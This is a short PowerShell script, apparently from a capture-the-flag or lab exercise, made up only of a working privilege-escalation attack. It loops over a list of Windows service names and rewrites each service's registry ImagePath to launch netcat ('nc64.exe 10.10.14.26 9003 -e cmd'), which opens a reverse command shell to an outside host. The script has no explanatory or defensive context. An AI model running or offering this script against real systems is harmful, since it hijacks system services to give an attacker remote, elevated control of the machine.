$reader = [System.IO.File]::OpenText("services-list.txt")
while($null -ne ($line = $reader.ReadLine())) {
try{	
	$arrService = Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\$line" -Name ImagePath -Value "C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd"
}catch {
"An error occured!"}
}
